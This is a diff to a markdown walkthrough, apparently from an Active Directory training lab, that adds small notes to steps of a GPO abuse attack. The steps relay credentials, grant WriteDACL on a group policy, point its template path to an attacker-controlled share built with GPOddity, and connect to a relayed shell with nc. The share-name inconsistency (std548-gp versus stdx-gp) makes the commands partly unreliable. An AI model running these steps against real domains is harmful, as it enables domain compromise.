@@ -5,6 +5,8 @@ Container. By relaying credentials of a user who has `WriteDACL` on GPO, we can
 modify the path (`gPCFileSysPath`) of the group policy template (default
 is `SYSVOL`).
 
+>**Note: `Get-DomainGPO -Identity "DevOps Policy"`**
+
 This enables loading of a malicious template from a location that we
 control.
 
@@ -28,7 +30,8 @@ After relay connect to shell
 nc 127.0.0.1 11000
 ```
 
-Delegate `WriteDACL` permissions to the group policy the relayed user can control
+Delegate `WriteDACL` permissions to the group policy the relayed user can control 
+> **Note:** Use `name` output from PowerView as GPO
 ```bash
 write_gpo_dacl student548 {0BF8D01C-1F62-4BDC-958C-57140B67D147}
 ```
@@ -54,7 +57,7 @@ mkdir /mnt/c/AD/Tools/std548-gp
 cp -r /mnt/c/AD/Tools/GPOddity/GPT_Out/* /mnt/c/AD/Tools/std548-gp
 ```
 
-From Admin CMD create a the file share called `std548-gp` and grant full perms to everyone
+From **Admin** CMD create a the file share called `std548-gp` and grant full perms to everyone
 ```powershell
 net share stdx-gp=C:\AD\Tools\stdx-gp /grant:Everyone,Full
 
